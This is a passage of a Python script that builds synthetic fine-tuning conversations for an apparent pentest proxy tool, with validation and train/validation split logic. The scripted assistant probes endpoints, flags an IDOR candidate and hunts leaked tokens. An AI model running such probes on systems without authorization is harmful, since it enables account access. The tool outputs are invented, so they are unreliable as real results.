    """Multi-turn MCP conversations (several user turns, each driving tool rounds)
    — the tool-calling analogue of the shell engagements."""
    out: list[dict[str, Any]] = []
    convo_targets = [t for t in TARGETS if t.kind in ("rest", "webapp", "spa", "graphql")]
    for t in convo_targets:
        b = _idbase(t)
        dns_id, http_id = b, b + 1
        out.append(
            mcp_conversation(
                tags=["mcp", "multi-turn", "engagement", t.key],
                exchanges=[
                    {
                        "user": f"Probe {t.host}/v1/me through the sandbox.",
                        "steps": [
                            {
                                "preamble": "Run the request via the exec tool.",
                                "tool": "exec",
                                "args": {"argv": ["curl", "-s", "-o", "/dev/null",
                                                  f"{t.base}/v1/me"]},
                                "result": {"exit_code": 0,
                                           "captured_request_ids": [dns_id, http_id],
                                           "exec_id": "exec-7-0-1781400900000000000"},
                                "interp": f"Captured flow {dns_id} (DNS) and {http_id} (the "
                                "HTTPS GET). Ask me to inspect it.",
                            }
                        ],
                    },
                    {
                        "user": "What did it return?",
                        "steps": [
                            {
                                "preamble": "Decode the captured flow.",
                                "tool": "req_show",
                                "args": {"id": http_id},
                                "result": {"id": http_id, "protocol": t.protocol,
                                           "request": {"method": "GET", "path": "/v1/me"},
                                           "response": {"status": 200,
                                                        "body": '{"id":1001,"role":"user"}'}},
                                "interp": "Returns a numeric, guessable id (1001) — IDOR-prone. "
                                "Want me to flag it?",
                            }
                        ],
                    },
                    {
                        "user": "Yes, tag it idor-candidate.",
                        "steps": [
                            {
                                "preamble": "Tag the flow.",
                                "tool": "tag_add",
                                "args": {"flow_id": http_id, "name": "idor-candidate"},
                                "result": {"tag_id": 2},
                                "interp": f"Tagged flow {http_id} `idor-candidate` (tag_id 2). "
                                "Next: exec a request to `/v1/users/1002` with the same token "
                                "and compare.",
                            }
                        ],
                    },
                ],
            )
        )
    # an orientation → search → show conversation per a few targets
    for t in (TARGETS[2], TARGETS[4], TARGETS[8]):
        b = _idbase(t)
        out.append(
            mcp_conversation(
                tags=["mcp", "multi-turn", "orientation", "search", t.key],
                exchanges=[
                    {
                        "user": "I just connected — which session am I on and how many flows?",
                        "steps": [
                            {
                                "preamble": "Check the active session.",
                                "tool": "session_current",
                                "args": {},
                                "result": {"active": t.key, "db_exists": True},
                                "interp": f"Active session `{t.key}`, db present. Ask what you "
                                "want to hunt for.",
                            }
                        ],
                    },
                    {
                        "user": "Did any response leak a token?",
                        "steps": [
                            {
                                "preamble": "Full-text search the captured bodies.",
                                "tool": "req_search",
                                "args": {"query": "token"},
                                "result": {"flow_ids": [b + 1]},
                                "interp": f"One hit: flow {b + 1}. Want it decoded?",
                            }
                        ],
                    },
                    {
                        "user": "Show it.",
                        "steps": [
                            {
                                "preamble": "Decode the flow.",
                                "tool": "req_show",
                                "args": {"id": b + 1, "raw": True},
                                "result": {"id": b + 1, "protocol": t.protocol,
                                           "response": {"status": 200,
                                                        "body": '{"access_token":"eyJ..."}'}},
                                "interp": "The response body returns an access token in "
                                "cleartext — sensitive-data exposure. Recommend tagging it as "
                                "evidence.",
                            }
                        ],
                    },
                ],
            )
        )
    return out


# Assembly, dedup, split.
# --------------------------------------------------------------------------- #

FAMILIES = [
    fam_setup,
    fam_sessions,
    fam_exec_recon,
    fam_req_list,
    fam_req_show_search,
    fam_replay,
    fam_intercept_cli,
    fam_match_replace,
    fam_tag_note_workspace,
    fam_export,
    fam_negatives,
    fam_meta,
    fam_cli_workflows,
    fam_mcp_single,
    fam_mcp_multi,
    fam_recon_sweep,
    fam_vuln_probe_sweep,
    fam_req_list_sweep,
    fam_tag_note_sweep,
    fam_mcp_recon_sweep,
    fam_mcp_query_sweep,
    fam_recon_flag_variants,
    fam_vuln_workflows_sweep,
    fam_mcp_tag_note_sweep,
    fam_mcp_intercept_sweep,
    fam_mcp_exec_flag_variants,
    fam_shell_recon,
    fam_shell_recon_inspect,
    fam_shell_engagements,
    fam_shell_vuln_workflows,
    fam_mcp_conversations,
]


def _normalized_key(rec: dict[str, Any]) -> str:
    """Hash a record's semantic content (roles + content), ignoring volatile
    fields like tags ordering and call ids, for near-duplicate detection."""
    parts: list[str] = [rec["style"]]
    for m in rec["messages"]:
        role = m["role"]
        content = (m.get("content") or "").strip()
        # Fold tool_calls into the content signature (name + args), dropping ids.
        tcs = m.get("tool_calls")
        if tcs:
            for tc in tcs:
                fn = tc.get("function", {})
                content += f"|TC:{fn.get('name')}:{fn.get('arguments')}"
        if role == "tool":
            content += f"|TOOLRES:{m.get('name')}:{m.get('content')}"
        parts.append(f"{role}\x1f{content}")
    blob = "\x1e".join(parts)
    return hashlib.sha256(blob.encode("utf-8")).hexdigest()


def is_multiturn(rec: dict[str, Any]) -> bool:
    """True if the conversation has more than one *user* turn (a genuine
    back-and-forth, as opposed to a single-shot or single-user multi-step)."""
    return sum(1 for m in rec["messages"] if m.get("role") == "user") > 1


def _subsample_by_style(
    unique: list[dict[str, Any]], keep: set[int]
) -> list[dict[str, Any]]:
    """Filter ``unique`` to records whose id() is in ``keep`` (stable order)."""
    return [r for r in unique if id(r) in keep]


def build_dataset(
    target: int | None, seed: int, multiturn_frac: float | None = None
) -> list[dict[str, Any]]:
    """Generate all family records, dedup, optionally balance the multi-turn
    fraction, and (optionally) cap to ~target with a deterministic, style-balanced
    selection."""
    records: list[dict[str, Any]] = []
    for fam in FAMILIES:
        records.extend(fam())

    # Dedup by normalized content (keep first occurrence, stable order).
    seen: set[str] = set()
    unique: list[dict[str, Any]] = []
    for rec in records:
        key = _normalized_key(rec)
        if key in seen:
            continue
        seen.add(key)
        unique.append(rec)

    # Balance toward ~multiturn_frac multi-turn conversations by deterministically
    # subsampling SINGLE-turn records (we never drop multi-turn, and keep the
    # per-style mix within the single-turn pool). The families remain the source
    # of truth; this only shapes the emitted set. Disabled when frac is falsy.
    if multiturn_frac and 0.0 < multiturn_frac < 1.0:
        multi = [r for r in unique if is_multiturn(r)]
        single = [r for r in unique if not is_multiturn(r)]
        if multi and single:
            keep_single = int(round(len(multi) * (1.0 - multiturn_frac) / multiturn_frac))
            if keep_single < len(single):
                rng = random.Random(seed + 2)
                by_style: dict[str, list[dict[str, Any]]] = {}
                for r in single:
                    by_style.setdefault(r["style"], []).append(r)
                keep: set[int] = set(id(r) for r in multi)
                total_single = len(single)
                for st in sorted(by_style):
                    group = by_style[st]
                    rng.shuffle(group)
                    n_keep = int(round(keep_single * len(group) / total_single))
                    keep |= set(id(r) for r in group[:n_keep])
                unique = _subsample_by_style(unique, keep)

    # If a smaller target is requested, deterministically subsample while keeping
    # each style roughly proportional. We never *pad*: a target above the available
    # count just returns everything (the families are the ceiling).
    if target is not None and target < len(unique):
        rng = random.Random(seed)
        by_style2: dict[str, list[dict[str, Any]]] = {}
        for r in unique:
            by_style2.setdefault(r["style"], []).append(r)
        frac = target / len(unique)
        keep2: set[int] = set()
        styles = sorted(by_style2)
        allocated = 0
        for idx, st in enumerate(styles):
            group = by_style2[st]
            rng.shuffle(group)
            n = (target - allocated) if idx == len(styles) - 1 else round(len(group) * frac)
            n = max(0, min(n, len(group)))
            allocated += n
            keep2 |= set(id(r) for r in group[:n])
        unique = _subsample_by_style(unique, keep2)

    return unique


def split_dataset(
    records: list[dict[str, Any]], seed: int, val_frac: float = 0.05
) -> tuple[list[dict[str, Any]], list[dict[str, Any]]]:
    """Deterministic train/validation split, stratified by style so every style
    (cli/mcp/shell) appears in both files."""
    rng = random.Random(seed + 1)
    train: list[dict[str, Any]] = []
    val: list[dict[str, Any]] = []
    for style in sorted({r["style"] for r in records}):
        group = [r for r in records if r["style"] == style]
        idx = list(range(len(group)))
        rng.shuffle(idx)
        n_val = max(1, round(len(group) * val_frac)) if group else 0
        val_idx = set(idx[:n_val])
        for i, r in enumerate(group):
            (val if i in val_idx else train).append(r)
    # Preserve a stable order within each split (by normalized key) for a
    # reviewable, byte-identical diff.
    train.sort(key=_normalized_key)
    val.sort(key=_normalized_key)
    return train, val


def emit(records: Iterable[dict[str, Any]], fh) -> None:
    for rec in records:
        fh.write(json.dumps(rec, ensure_ascii=False, sort_keys=True))
        fh.write("\n")


# --------------------------------------------------------------------------- #
# Validation.
# --------------------------------------------------------------------------- #

VALID_ROLES = {"system", "user", "assistant", "tool"}


def _extract_commands(text: str) -> list[str]:
    """Pull burpwn command lines out of fenced code blocks for the linter."""
    cmds: list[str] = []
    for line in text.splitlines():
        s = line.strip()
        if s.startswith("burpwn "):
            cmds.append(s)
    return cmds


def _lint_cli_command(cmd: str) -> list[str]:
    """Lenient check that a `burpwn …` command uses only known subcommands/flags.
    Stops scanning at `--` (everything after is the sandboxed child command)."""
    import shlex

    errs: list[str] = []
    # Strip quoted segments so values like a note body or header string aren't
    # mis-read as flags. shlex tokenizes respecting quotes; we then only inspect
    # tokens that the *source* presented bare (i.e. dash-led and unquoted).
    try:
        toks = shlex.split(cmd, comments=True)
    except ValueError:
        # Unbalanced quotes in illustrative text — skip linting this line.
        return errs
    # toks[0] == 'burpwn'
    for tok in toks[1:]:
        if tok == "--":
            break  # child command follows; not burpwn's surface
        # Only a token that *starts* with a dash in the raw command is a flag.
        # After shlex, a quoted value loses its quotes, so guard against values
        # that merely begin with '-' by also requiring it to look like a flag
        # (alpha after the dashes).
        if tok.startswith("--") and len(tok) > 2 and (tok[2].isalpha()):
            flag = tok.split("=", 1)[0]
            if flag not in KNOWN_CLI_FLAGS:
                errs.append(f"unknown burpwn flag {flag!r} in: {cmd}")
        elif tok.startswith("-") and len(tok) == 2 and tok[1].isalpha():
            if tok not in KNOWN_CLI_FLAGS:
                errs.append(f"unknown burpwn flag {tok!r} in: {cmd}")
    return errs


def validate_record(idx: int, rec: dict[str, Any]) -> list[str]:
    errs: list[str] = []

    def err(msg: str) -> None:
        errs.append(f"line {idx}: {msg}")

    if rec.get("schema_version") != SCHEMA_VERSION:
        err(f"schema_version must be {SCHEMA_VERSION!r}")
    style = rec.get("style")
    if style not in {"cli", "mcp", "shell"}:
        err(f"style must be 'cli', 'mcp' or 'shell', got {style!r}")
    if not isinstance(rec.get("tags"), list) or not rec["tags"]:
        err("tags must be a non-empty list")
    msgs = rec.get("messages")
    if not isinstance(msgs, list) or len(msgs) < 3:
        err("messages must be a list of >=3 turns")
        return errs

    for i, m in enumerate(msgs):
        if not isinstance(m, dict):
            err(f"message {i} is not an object")
            continue
        role = m.get("role")
        if role not in VALID_ROLES:
            err(f"message {i} has invalid role {role!r}")
        if "content" not in m:
            err(f"message {i} missing 'content'")

    if msgs[0].get("role") != "system":
        err("first message must be role 'system'")
    if msgs[1].get("role") != "user":
        err("second message must be role 'user'")
    if msgs[-1].get("role") != "assistant":
        err("last message must be role 'assistant'")

    if style == "cli":
        # Alternating user/assistant after the system turn, ending on assistant.
        body = msgs[1:]
        if len(body) % 2 != 0:
            err("cli body (after system) must have an even number of turns")
        for j, m in enumerate(body):
            expect = "user" if j % 2 == 0 else "assistant"
            if m.get("role") != expect:
                err(f"cli turn {j + 1} must be {expect!r}, got {m.get('role')!r}")
            if m.get("role") == "assistant" and not (m.get("content") or "").strip():
                err(f"cli assistant turn {j + 1} content must be non-empty")
        # Lint any burpwn commands in assistant turns.
        for m in body:
            if m.get("role") == "assistant":
                for cmd in _extract_commands(m.get("content", "")):
                    errs.extend(_lint_cli_command(cmd))

    elif style in ("mcp", "shell"):
        _validate_agentic(style, msgs, err)
    return errs


def _validate_tool_round(
    style: str, exi: int, ti: int, a_call: dict, a_tool: dict, a_final: dict, err
) -> None:
    """Validate one ``assistant(tool_calls) → tool → assistant(interp)`` round of
    an mcp/shell exchange."""
    where = f"{style} exchange {exi} round {ti}"
    if a_call.get("role") != "assistant" or "tool_calls" not in a_call:
        err(f"{where}: first turn must be assistant with tool_calls")
        return
    tcs = a_call["tool_calls"]
    if not isinstance(tcs, list) or len(tcs) != 1:
        err(f"{where}: tool_calls must be a single-element list")
        return
    call = tcs[0]
    fn = call.get("function", {})
    if not call.get("id"):
        err(f"{where}: tool_call missing id")
    if call.get("type") != "function":
        err(f"{where}: tool_call type must be 'function'")
    name = fn.get("name")
    if style == "shell":
        if name != SHELL_TOOL_NAME:
            err(f"{where}: shell tool name must be {SHELL_TOOL_NAME!r}, got {name!r}")
    elif name not in MCP_TOOL_NAMES:
        err(f"{where}: unknown MCP tool {name!r}")
    args = fn.get("arguments")
    parsed_args: Any = None
    if not isinstance(args, str):
        err(f"{where}: arguments must be a JSON string")
    else:
        try:
            parsed_args = json.loads(args)
        except json.JSONDecodeError as e:
            err(f"{where}: arguments not valid JSON: {e}")
    if style == "shell" and isinstance(parsed_args, dict):
        cmd = parsed_args.get("command")
        if not isinstance(cmd, str) or not cmd.strip():
            err(f"{where}: Bash tool call must carry a non-empty 'command'")
        elif cmd.strip().startswith("burpwn "):
            for e2 in _lint_cli_command(cmd.strip()):
                err(f"{where}: {e2}")
    # tool result turn
    if a_tool.get("role") != "tool":
        err(f"{where}: second turn must be role 'tool'")
    else:
        if a_tool.get("tool_call_id") != call.get("id"):
            err(f"{where}: tool_call_id mismatch")
        if a_tool.get("name") != name:
            err(f"{where}: tool name mismatch")
        tc = a_tool.get("content")
        if not isinstance(tc, str):
            err(f"{where}: tool content must be a string")
        elif style == "mcp":
            # MCP tool results are JSON-encoded strings; shell results are raw
            # command stdout (any string, possibly empty).
            try:
                json.loads(tc)
            except json.JSONDecodeError as e:
                err(f"{where}: tool content not valid JSON: {e}")
    # assistant interpretation turn
    if a_final.get("role") != "assistant":
        err(f"{where}: third turn must be assistant")
    elif "tool_calls" in a_final:
        err(f"{where}: interpretation turn must not contain tool_calls")
    elif not (a_final.get("content") or "").strip():
        err(f"{where}: assistant interpretation must be non-empty")


def _validate_agentic(style: str, msgs: list[dict], err) -> None:
    """Validate the general tool-calling grammar shared by mcp + shell records:

        system, ( user, ( assistant(tool_calls), tool, assistant(interp) )+ )+

    i.e. one or more *exchanges*, each a user turn followed by one or more tool
    rounds. This admits genuine multi-turn conversations (several user turns) as
    well as the single-user-turn form. Tool rounds are fixed 3-message groups."""
    body = msgs[1:]  # everything after the system turn
    if not body or body[0].get("role") != "user":
        err(f"{style}: second message must be 'user'")
        return
    i, n = 0, len(body)
    exi = 0
    while i < n:
        if body[i].get("role") != "user":
            err(f"{style}: expected a 'user' turn to open exchange {exi + 1}, "
                f"got {body[i].get('role')!r}")
            return
        i += 1
        exi += 1
        rounds = 0
        while i < n and body[i].get("role") != "user":
            if i + 2 >= n:
                err(f"{style} exchange {exi}: truncated tool round "
                    "(need assistant/tool/assistant)")
                return
            _validate_tool_round(
                style, exi, rounds, body[i], body[i + 1], body[i + 2], err
            )
            rounds += 1
            i += 3
        if rounds == 0:
            err(f"{style} exchange {exi}: user turn not followed by a tool round")
    if exi == 0:
        err(f"{style}: no exchanges found")


def run_validate(path: str) -> int:
    if path == "-":
        lines = sys.stdin.read().splitlines()
        src = "<stdin>"
    else:
        with open(path, "r", encoding="utf-8") as fh:
            lines = fh.read().splitlines()
        src = path

    problems: list[str] = []
    by_style: dict[str, int] = {}
    n_multi = 0
    keys: dict[str, int] = {}
    dupes = 0
    for idx, line in enumerate(lines, start=1):
        if not line.strip():
            continue
        try:
            rec = json.loads(line)
        except json.JSONDecodeError as e:
            problems.append(f"line {idx}: not valid JSON: {e}")
            continue
        errs = validate_record(idx, rec)
        problems.extend(errs)
        if not errs:
            by_style[rec.get("style")] = by_style.get(rec.get("style"), 0) + 1
            if is_multiturn(rec):
                n_multi += 1
            k = _normalized_key(rec)
            if k in keys:
                dupes += 1
                problems.append(
                    f"line {idx}: near-duplicate of line {keys[k]} (normalized content)"
                )
            else:
                keys[k] = idx

    total = sum(by_style.values())
    breakdown = ", ".join(f"{by_style[s]} {s}" for s in sorted(by_style))
    pct = (100 * n_multi // total) if total else 0
    if problems:
        for p in problems:
            print(p, file=sys.stderr)
        print(
            f"FAIL: {len(problems)} problem(s) in {src} "
            f"({total} records: {breakdown}; {n_multi} multi-turn; {dupes} dupes)",
            file=sys.stderr,
        )
        return 1
    print(
        f"OK: {src} — {total} records ({breakdown}; {n_multi} multi-turn = {pct}%), "
        f"0 dupes, schema {SCHEMA_VERSION}",
        file=sys.stderr,
    )
    return 0


# --------------------------------------------------------------------------- #
# CLI.
# --------------------------------------------------------------------------- #

DEFAULT_SEED = 1337
HERE = os.path.dirname(os.path.abspath(__file__))


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(description="burpwn fine-tuning dataset generator")
    ap.add_argument(
        "--validate", nargs="?", const="dataset.jsonl", metavar="PATH",
        help="validate a JSONL file (default ./dataset.jsonl, '-'=stdin) instead of generating",
    )
    ap.add_argument(
        "--target", type=int, default=None, metavar="N",
        help="aim for ~N examples (deterministic, style-balanced subsample; never pads "
        "beyond the families' ceiling)",
    )
    ap.add_argument("--seed", type=int, default=DEFAULT_SEED, help="reproducible RNG seed")
    ap.add_argument(
        "--multiturn-frac", type=float, default=0.5, metavar="F",
        help="balance the emitted set to ~F multi-turn conversations by deterministically "
        "subsampling single-turn records (default 0.5; 0 disables balancing, keeping all)",
    )
    ap.add_argument(
        "--val-frac", type=float, default=0.05, help="validation split fraction (default 0.05)"
    )
    ap.add_argument(
        "--stdout", action="store_true",
        help="emit the combined dataset to stdout instead of writing files",
    )
    ap.add_argument(
        "--outdir", default=HERE, help="directory to write dataset files into (default: script dir)"
    )
    args = ap.parse_args(argv)

    if args.validate is not None:
        return run_validate(args.validate)

    records = build_dataset(args.target, args.seed, args.multiturn_frac)
    train, val = split_dataset(records, args.seed, args.val_frac)
    # Combined file uses the same stable order as the splits concatenated:
    combined = sorted(records, key=_normalized_key)

    if args.stdout:
        emit(combined, sys.stdout)
        return 0

    paths = {
        "dataset.jsonl": combined,
        "dataset.train.jsonl": train,
        "dataset.validation.jsonl": val,
    }
    for fname, recs in paths.items():
        with open(os.path.join(args.outdir, fname), "w", encoding="utf-8") as fh:
            emit(recs, fh)
    by_style: dict[str, int] = {}
    for r in combined:
        by_style[r["style"]] = by_style.get(r["style"], 0) + 1
    n_multi = sum(1 for r in combined if is_multiturn(r))
    breakdown = ", ".join(f"{by_style[s]} {s}" for s in sorted(by_style))
    pct = (100 * n_multi // len(combined)) if combined else 0
    print(
        f"wrote {len(combined)} records ({breakdown}; {n_multi} multi-turn = {pct}%) → "
        f"dataset.jsonl; train={len(train)} validation={len(val)} "
        f"(seed={args.seed}, multiturn_frac={args.multiturn_frac})",
        file=sys.stderr,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
